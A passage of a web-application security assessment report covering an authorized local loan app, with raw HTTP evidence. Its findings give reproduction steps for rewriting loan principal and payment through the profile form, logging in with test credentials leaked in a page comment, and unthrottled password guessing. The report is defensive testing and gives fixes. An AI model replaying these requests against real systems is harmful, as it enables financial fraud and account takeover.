+                // Set the iframe src attribute to the /amortization endpoint
+                $('#amortizationIframe').attr('src', '/amortization?term=1');
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31t61i-1w</code> — <code>artifacts/s-0003/ev-mr31t61i-1w/</code></div><div class="lbl">REQUEST</div><pre>GET /loan_details HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 2448
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:12:52 GMT
+expires: 0
+keep-alive: timeout=5, max=95
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Loan Details&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Loan Details&lt;/h2&gt;
+                &lt;p&gt;Your loan principal is 500000.0&lt;/p&gt;
+                &lt;p&gt;The term of your loan principal 1 months&lt;/p&gt;
+                &lt;p&gt;Your monthly payment is 0.01&lt;/p&gt;
+
+                &lt;!-- Button to trigger loading of amortization table in iframe --&gt;
+                &lt;button id=&quot;showAmortizationTable&quot; class=&quot;btn btn-primary&quot;&gt;Show Amortization Table&lt;/button&gt;
+                
+                &lt;!-- Placeholder for iframe --&gt;
+                &lt;div id=&quot;iframeContainer&quot; style=&quot;margin-top: 20px;&quot;&gt;
+                    &lt;iframe id=&quot;amortizationIframe&quot; src=&quot;&quot; style=&quot;width: 100%; height: 500px; border: none;&quot;&gt;&lt;/iframe&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/profile&quot;&gt;Profile&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/loan_details&quot;&gt;Loan Details&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/logout&quot;&gt;Exit&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;!-- jQuery (you may need to include it if not already included) --&gt;
+    &lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;script&gt;
+        $(document).ready(function() {
+            // Event listener for button click
+            $('#showAmortizationTable').click(function() {
+                // Set the iframe src attribute to the /amortization endpoint
+                $('#amortizationIframe').attr('src', '/amortization?term=1');
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 3. [price-tampering] Multi-step price tampering: borrower rewrites loan principal via /profile → authoritative /loan_details record</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32836</div>
+<div class="desc">POST /profile accepts an arbitrary loan_amount (loan principal) with no server-side validation or authorization, and the submitted value becomes the borrower's AUTHORITATIVE loan record rendered at GET /loan_details. This is a multi-step (write-then-read) business-logic flaw: the customer unilaterally sets the financial terms the system treats as official.
+
+Walked flow: step1 POST /profile loan_amount=1337 → 302; step2 GET /loan_details → &quot;Your loan principal is 1337.0&quot;. Confirmed value takes over the record: earlier POSTs also drove /loan_details to &quot;principal is 1.0&quot; and &quot;999 months&quot; and &quot;monthly payment is 0.01&quot; simultaneously (loan_amount, loan_term_months and monthly_payment are all attacker-controlled and all propagate). A borrower can inflate an approved principal, or zero out principal/payment/term to escape repayment.
+
+Distinct from the already-recorded single-request price-tampering on /profile monthly_payment: this documents the loan_amount (principal) parameter and, more importantly, the cross-endpoint propagation of the manipulated figure into the loan-of-record shown by /loan_details. Root cause: profile update is trusted as the source of truth for loan terms that should be set/validated server-side and immutable to the borrower.</div>
+<div><b>Reproduction</b></div><pre>1. Log in as a normal user (test:test).
+2. POST /profile (application/x-www-form-urlencoded) body: name=John&amp;lastname=Doe&amp;email=john@example.com&amp;loan_amount=1337&amp;loan_term_months=12&amp;monthly_payment=850.0 → 302 to /home.
+3. GET /loan_details → renders &quot;Your loan principal is 1337.0&quot; (the injected value is now the authoritative loan record).
+4. Extremes work identically: loan_amount=1, loan_term_months=999, monthly_payment=0.01 → /loan_details shows principal 1.0 / 999 months / payment 0.01.
+Fix: loan principal/term/payment must be set and validated server-side (against the approved loan), never taken from a borrower-editable profile form; make these fields read-only for the customer and re-derive monthly_payment from validated principal+term+rate.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr32vkbh-5x</code> — <code>artifacts/_/ev-mr32vkbh-5x/</code></div><div class="lbl">REQUEST</div><pre>GET /loan_details HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 2450
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:42:43 GMT
+expires: 0
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Loan Details&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Loan Details&lt;/h2&gt;
+                &lt;p&gt;Your loan principal is 10000.0&lt;/p&gt;
+                &lt;p&gt;The term of your loan principal 12 months&lt;/p&gt;
+                &lt;p&gt;Your monthly payment is 850.0&lt;/p&gt;
+
+                &lt;!-- Button to trigger loading of amortization table in iframe --&gt;
+                &lt;button id=&quot;showAmortizationTable&quot; class=&quot;btn btn-primary&quot;&gt;Show Amortization Table&lt;/button&gt;
+                
+                &lt;!-- Placeholder for iframe --&gt;
+                &lt;div id=&quot;iframeContainer&quot; style=&quot;margin-top: 20px;&quot;&gt;
+                    &lt;iframe id=&quot;amortizationIframe&quot; src=&quot;&quot; style=&quot;width: 100%; height: 500px; border: none;&quot;&gt;&lt;/iframe&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/profile&quot;&gt;Profile&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/loan_details&quot;&gt;Loan Details&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/logout&quot;&gt;Exit&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;!-- jQuery (you may need to include it if not already included) --&gt;
+    &lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;script&gt;
+        $(document).ready(function() {
+            // Event listener for button click
+            $('#showAmortizationTable').click(function() {
+                // Set the iframe src attribute to the /amortization endpoint
+                $('#amortizationIframe').attr('src', '/amortization?term=12');
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr32vkve-5z</code> — <code>artifacts/_/ev-mr32vkve-5z/</code></div><div class="lbl">REQUEST</div><pre>GET /loan_details HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 2449
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:42:44 GMT
+expires: 0
+keep-alive: timeout=5, max=97
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Loan Details&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Loan Details&lt;/h2&gt;
+                &lt;p&gt;Your loan principal is 1337.0&lt;/p&gt;
+                &lt;p&gt;The term of your loan principal 12 months&lt;/p&gt;
+                &lt;p&gt;Your monthly payment is 850.0&lt;/p&gt;
+
+                &lt;!-- Button to trigger loading of amortization table in iframe --&gt;
+                &lt;button id=&quot;showAmortizationTable&quot; class=&quot;btn btn-primary&quot;&gt;Show Amortization Table&lt;/button&gt;
+                
+                &lt;!-- Placeholder for iframe --&gt;
+                &lt;div id=&quot;iframeContainer&quot; style=&quot;margin-top: 20px;&quot;&gt;
+                    &lt;iframe id=&quot;amortizationIframe&quot; src=&quot;&quot; style=&quot;width: 100%; height: 500px; border: none;&quot;&gt;&lt;/iframe&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/profile&quot;&gt;Profile&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/loan_details&quot;&gt;Loan Details&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/logout&quot;&gt;Exit&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;!-- jQuery (you may need to include it if not already included) --&gt;
+    &lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;script&gt;
+        $(document).ready(function() {
+            // Event listener for button click
+            $('#showAmortizationTable').click(function() {
+                // Set the iframe src attribute to the /amortization endpoint
+                $('#amortizationIframe').attr('src', '/amortization?term=12');
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr32vlfa-61</code> — <code>artifacts/_/ev-mr32vlfa-61/</code></div><div class="lbl">REQUEST</div><pre>GET /loan_details HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 2449
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:42:44 GMT
+expires: 0
+keep-alive: timeout=5, max=95
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Loan Details&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Loan Details&lt;/h2&gt;
+                &lt;p&gt;Your loan principal is 1337.0&lt;/p&gt;
+                &lt;p&gt;The term of your loan principal 12 months&lt;/p&gt;
+                &lt;p&gt;Your monthly payment is 850.0&lt;/p&gt;
+
+                &lt;!-- Button to trigger loading of amortization table in iframe --&gt;
+                &lt;button id=&quot;showAmortizationTable&quot; class=&quot;btn btn-primary&quot;&gt;Show Amortization Table&lt;/button&gt;
+                
+                &lt;!-- Placeholder for iframe --&gt;
+                &lt;div id=&quot;iframeContainer&quot; style=&quot;margin-top: 20px;&quot;&gt;
+                    &lt;iframe id=&quot;amortizationIframe&quot; src=&quot;&quot; style=&quot;width: 100%; height: 500px; border: none;&quot;&gt;&lt;/iframe&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/profile&quot;&gt;Profile&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/loan_details&quot;&gt;Loan Details&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/logout&quot;&gt;Exit&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;!-- jQuery (you may need to include it if not already included) --&gt;
+    &lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;script&gt;
+        $(document).ready(function() {
+            // Event listener for button click
+            $('#showAmortizationTable').click(function() {
+                // Set the iframe src attribute to the /amortization endpoint
+                $('#amortizationIframe').attr('src', '/amortization?term=12');
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 4. [secret-exposure] Valid credentials (test:test) disclosed in login page HTML comment</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32836</div>
+<div class="desc">The GET /login page source contains the HTML comment &quot;&lt;!-- TODO: Delete the testing account (test:test). --&gt;&quot;, disclosing a working username/password pair to any unauthenticated visitor. These credentials are live: POST /login with username=test&amp;password=test authenticates successfully (302 -&gt; /home) and issues a Flask session cookie for user_id 1 (session value base64-decodes to {&quot;user_id&quot;:1}). Any anonymous user who views the page source obtains full authenticated access to the application. Wrong password for the same user (test/brute1) is correctly rejected (200 &quot;Invalid username or password&quot;), confirming the credential pair is what grants access, not a catch-all. Severity would rise to high/critical if user_id 1 is a privileged/admin account.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32836/login and read the page source; observe the comment: &lt;!-- TODO: Delete the testing account (test:test). --&gt;. 2. Negative control: POST /login (no session) body username=test&amp;password=brute1 -&gt; 200, &quot;Invalid username or password&quot; (ev-mr31lbeq-14). 3. POST /login (no session) body username=test&amp;password=test -&gt; 302 Location /home, Set-Cookie session=eyJ1c2VyX2lkIjoxfQ... (ev-mr31kqhp-12). 4. Repeat step 3 -&gt; same 302 + session (ev-mr31kr1e-13). The leaked credentials grant a valid authenticated session as user_id 1.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31lbeq-14</code> — <code>artifacts/s-0001/ev-mr31lbeq-14/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=test&amp;password=brute1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1900
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:06:45 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- TODO: Delete the testing account (test:test). --&gt; 
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-center mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-6&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h2 class=&quot;card-title text-center&quot;&gt;Login&lt;/h2&gt;
+                        &lt;form id=&quot;loginForm&quot; action=&quot;/login&quot; method=&quot;post&quot;&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username:&lt;/label&gt;
+                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password:&lt;/label&gt;
+                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Login&lt;/button&gt;
+                        &lt;/form&gt;
+                        
+                        &lt;!-- Display error message if login fails --&gt;
+                        &lt;div class=&quot;alert alert-danger mt-3&quot; role=&quot;alert&quot;&gt;
+                            Invalid username or password
+                        &lt;/div&gt;
+                        
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31kqhp-12</code> — <code>artifacts/s-0001/ev-mr31kqhp-12/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=test&amp;password=test</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 197
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:06:18 GMT
+expires: 0
+keep-alive: timeout=5, max=98
+location: /home
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/home&quot;&gt;/home&lt;/a&gt;. If not, click the link.</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31kr1e-13</code> — <code>artifacts/s-0001/ev-mr31kr1e-13/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=test&amp;password=test</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 197
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:06:19 GMT
+expires: 0
+keep-alive: timeout=5, max=97
+location: /home
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/home&quot;&gt;/home&lt;/a&gt;. If not, click the link.</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 5. [rate-limit] No rate limiting or account lockout on /login (brute-force enabled)</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32836</div>
+<div class="desc">The POST /login endpoint applies no rate limiting, throttling, CAPTCHA, or account-lockout. ~20 consecutive failed authentication attempts (including a 12-request rapid burst) against user 'test' with wrong passwords were each processed fully and returned 200 with the generic &quot;Invalid username or password&quot; message — no 429, no Retry-After, no progressive delay, no lockout, no challenge at any point. The endpoint continues to accept and evaluate credentials indefinitely, permitting unlimited online password brute-force / credential-stuffing. The distinguishing control (a genuine test:test attempt) returns a differentiated 302 success, confirming each request is fully evaluated rather than blanket-blocked by a WAF.</div>
+<div><b>Reproduction</b></div><pre>1. Send POST /login (no session) with body username=test&amp;password=bruteN for N=1..12 in rapid succession (plus ~8 earlier failed attempts). 2. Every response is 200 with body &quot;Invalid username or password&quot; (e.g. ev-mr31llon-1d, ev-mr31lmng-1e, ev-mr31lnv7-1f) — no 429, no Retry-After header, no lockout message, no CAPTCHA, no added latency. 3. A valid credential still authenticates immediately afterward (ev-mr31ibsf-7, 302), proving requests are being fully evaluated with no throttle in place.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31ibsf-7</code> — <code>artifacts/s-0001/ev-mr31ibsf-7/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+
+username=test&amp;password=test</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 197
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:04:26 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+location: /home
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/home&quot;&gt;/home&lt;/a&gt;. If not, click the link.</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31lmng-1e</code> — <code>artifacts/s-0001/ev-mr31lmng-1e/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=test&amp;password=brute11</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1900
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:07:00 GMT
+expires: 0
+keep-alive: timeout=5, max=90
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- TODO: Delete the testing account (test:test). --&gt; 
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-center mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-6&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h2 class=&quot;card-title text-center&quot;&gt;Login&lt;/h2&gt;
+                        &lt;form id=&quot;loginForm&quot; action=&quot;/login&quot; method=&quot;post&quot;&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username:&lt;/label&gt;
+                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password:&lt;/label&gt;
+                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Login&lt;/button&gt;
+                        &lt;/form&gt;
+                        
+                        &lt;!-- Display error message if login fails --&gt;
